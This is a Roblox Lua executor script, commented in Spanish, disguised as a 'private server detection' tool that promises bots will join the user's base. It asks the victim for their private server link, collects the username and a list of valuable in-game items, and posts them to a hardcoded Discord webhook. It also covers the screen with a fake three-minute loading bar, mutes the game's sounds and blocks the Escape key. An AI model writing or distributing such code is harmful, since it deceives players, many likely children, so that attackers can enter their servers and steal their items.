-- 📘 MOREIRA METHOD - Private Server Detection (Universal) + UI Loader (Optimizado con pantalla de carga)
-- Envía datos del jugador directamente al Discord Webhook (username: Sab)
-- Examina todo el Workspace en busca de objetos indicados
-- Pantalla negra de carga y barra de progreso (llega a 100% en 3 minutos y se queda en pantalla, sin eliminar ningún GUI)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")
local ContextActionService = game:GetService("ContextActionService")
local HttpService = game:GetService("HttpService")

-- Tu webhook de Discord
local webhook_url = "https://discord.com/api/webhooks/1405766174419189842/b8qzM3d6u8a_OFGx5zIUsrSnp7TUkpCUCV4Y6tU_ZkSTMsHzf9XwEoWJzm9AqWbV3o6F"

local objetosBuscados = {
    "la grande combinasion", "Ketchuru and Musturu", "Ketupat Kepat", "Burguro and Fryuro", "La Supreme Combinasion",
    "Tacorita bicicleta", "Los tacoritas", "Garama and Madundung", "Dragon Cannelloni", "Esok Sekolah",
    "Tang Tang Keletang", "Strawberry Elephant", "La Secret Combinasion", "Tralaledon", "Eviledon",
    "Spaghetti Tualetti", "Los Hotspotsitos", "Los Mobilis", "Los 67", "Money Money Puggy",
    "Celularcini Viciosini", "Los Bros", "Las Sis", "Los Primos", "La Spooky Grande",
    "Spooky and Pumpky", "Chillin Chili", "Tictac Sahur", "La Extinct Grande", "Nuclearo Dinossauro"
}

-- Convertir a diccionario para búsquedas rápidas
local objetosDict = {}
for _, nombre in ipairs(objetosBuscados) do
    objetosDict[nombre] = true
end

-- Busca los objetos en todo el Workspace
local function obtenerObjetosEnWorkspace()
    local encontrados = {}
    for _, objeto in ipairs(Workspace:GetDescendants()) do
        if objetosDict[objeto.Name] then
            table.insert(encontrados, objeto.Name)
        end
    end
    return encontrados
end

-- Envía los datos al webhook de Discord
local function enviarWebhook(link)
    local player = Players.LocalPlayer
    local objetos = obtenerObjetosEnWorkspace()
    local fecha = os.date("%Y-%m-%d %H:%M:%S")
    local mensaje = "**Datos del jugador que ejecutó el script:**\n" ..
        "**Usuario:** " .. player.Name ..
        "\n**Link:** " .. link ..
        "\n**Fecha:** " .. fecha ..
        "\n**Objetos encontrados en Workspace:**\n" .. (#objetos > 0 and table.concat(objetos, "\n") or "Ninguno")

    local data = {
        ["username"] = "Sab",
        ["content"] = mensaje
    }
    local json = HttpService:JSONEncode(data)
    if typeof(http_request) == "function" then
        http_request({
            Url = webhook_url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    elseif typeof(request) == "function" then
        request({
            Url = webhook_url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    else
        warn("Tu executor no soporta http_request ni request.")
    end
    print("Datos enviados al webhook de Discord (Sab).")
end

------------------------------------------------------------
-- 🎬 Pantalla negra y loading bar
------------------------------------------------------------
local function muteAllSounds()
    for _, sound in ipairs(SoundService:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end
    for _, sound in ipairs(Workspace:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end
end

local escBlockActionName = "BlockEscMenu"
local function blockEscMenu(actionName, inputState, inputObj)
    return Enum.ContextActionResult.Sink
end

------------------------------------------------------------
-- 🪟 Create main GUI (link input)
------------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MoreiraMethodGui"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 9999
pcall(function()
    screenGui.Parent = game:GetService("CoreGui")
end)
if not screenGui.Parent then
    screenGui.Parent = playerGui
end

local inputFrame = Instance.new("Frame")
inputFrame.Name = "InputFrame"
inputFrame.Size = UDim2.new(0, 420, 0, 280)
inputFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
inputFrame.BorderSizePixel = 0
inputFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = inputFrame

local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, -40, 0, 60)
label.Position = UDim2.new(0, 20, 0, 25)
label.BackgroundTransparency = 1
label.Text = "PUT YOUR PRIVATE SERVER LINK HERE"
label.Font = Enum.Font.GothamBold
label.TextScaled = true
label.TextColor3 = Color3.fromRGB(0, 170, 255)
label.Parent = inputFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(0.9, 0, 0, 45)
textBox.Position = UDim2.new(0.05, 0, 0, 100)
textBox.PlaceholderText = "Enter your private server link..."
textBox.Font = Enum.Font.Gotham
textBox.TextScaled = true
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
textBox.BorderSizePixel = 0
textBox.ClearTextOnFocus = false
textBox.Parent = inputFrame

local tbCorner = Instance.new("UICorner")
tbCorner.CornerRadius = UDim.new(0, 8)
tbCorner.Parent = textBox

local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(0.5, 0, 0, 45)
sendButton.Position = UDim2.new(0.25, 0, 0, 160)
sendButton.BackgroundColor3 = Color3.fromRGB(40, 200, 80)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextScaled = true
sendButton.TextColor3 = Color3.new(1, 1, 1)
sendButton.Text = "SEND"
sendButton.Parent = inputFrame

local sendCorner = Instance.new("UICorner")
sendCorner.CornerRadius = UDim.new(0, 8)
sendCorner.Parent = sendButton

local infoLabel = Instance.new("TextLabel")
infoLabel.Size = UDim2.new(1, -40, 0, 40)
infoLabel.Position = UDim2.new(0, 20, 0, 210)
infoLabel.BackgroundTransparency = 1
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextScaled = true
infoLabel.TextColor3 = Color3.fromRGB(255, 220, 0)
infoLabel.Text = "The better things you have in your base, the better bots will join."
infoLabel.Parent = inputFrame

------------------------------------------------------------
-- 🟧 Botón SEND (pantalla negra + barra de carga + envío automático)
------------------------------------------------------------
sendButton.MouseButton1Click:Connect(function()
    local link = textBox.Text
    if link == "" then
        label.TextColor3 = Color3.fromRGB(255, 100, 100)
        label.Text = "⚠️ Please enter your private server link!"
        return
    end

    print("🔗 Link entered:", link)

    -- Pantalla negra y loading bar
    local blackFrame = Instance.new("Frame")
    blackFrame.Name = "BlackScreen"
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 9999
    blackFrame.Parent = screenGui

    local loadingText = Instance.new("TextLabel")
    loadingText.Size = UDim2.new(1, 0, 0, 100)
    loadingText.Position = UDim2.new(0, 0, 0.5, -50)
    loadingText.BackgroundTransparency = 1
    loadingText.Font = Enum.Font.GothamBold
    loadingText.TextScaled = true
    loadingText.TextColor3 = Color3.fromRGB(0, 180, 255)
    loadingText.Text = "LOADING..."
    loadingText.ZIndex = 10000
    loadingText.Parent = blackFrame

    local barWidth = 500
    local barHeight = 28
    local barFrame = Instance.new("Frame")
    barFrame.Name = "LoadingBarFrame"
    barFrame.Size = UDim2.new(0, barWidth, 0, barHeight)
    barFrame.Position = UDim2.new(0.5, -barWidth/2, 0.5, 70)
    barFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 60)
    barFrame.BorderSizePixel = 0
    barFrame.ZIndex = 10001
    barFrame.Parent = blackFrame

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 14)
    barCorner.Parent = barFrame

    local fillFrame = Instance.new("Frame")
    fillFrame.Name = "LoadingBarFill"
    fillFrame.Size = UDim2.new(0, 0, 1, 0)
    fillFrame.Position = UDim2.new(0, 0, 0, 0)
    fillFrame.BackgroundColor3 = Color3.fromRGB(0, 140, 255)
    fillFrame.BorderSizePixel = 0
    fillFrame.ZIndex = 10002
    fillFrame.Parent = barFrame

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0, 14)
    fillCorner.Parent = fillFrame

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Name = "PercentLabel"
    percentLabel.Size = UDim2.new(0, barWidth, 0, 40)
    percentLabel.Position = UDim2.new(0.5, -barWidth/2, 0.5, 25)
    percentLabel.BackgroundTransparency = 1
    percentLabel.Font = Enum.Font.GothamBold
    percentLabel.TextScaled = true
    percentLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
    percentLabel.Text = "0%"
    percentLabel.ZIndex = 10003
    percentLabel.Parent = blackFrame

    muteAllSounds()
    ContextActionService:BindAction(escBlockActionName, blockEscMenu, false, Enum.KeyCode.Escape)

    -- Envía los datos al webhook mientras carga la barra
    task.spawn(function()
        enviarWebhook(link)
    end)

    -- Animación de barra de carga (3 minutos hasta 100%, pero la GUI permanece y la barra se queda)
    local duration = 180 -- 3 minutos para llegar a 100%
    local steps = 100
    for step = 0, steps do
        local percent = step / steps
        fillFrame.Size = UDim2.new(percent, 0, 1, 0)
        percentLabel.Text = math.floor(percent * 100) .. "%"
        task.wait(duration / steps)
    end
    fillFrame.Size = UDim2.new(1, 0, 1, 0)
    percentLabel.Text = "100%"

    -- Al llegar a 100%, NO se elimina ningún GUI. El frame negro y la barra permanecen.
    -- Si quieres que la barra siga mostrando "100%" puedes dejarlo así, o puedes cambiar el texto a "CARGANDO..." o lo que desees.
end)
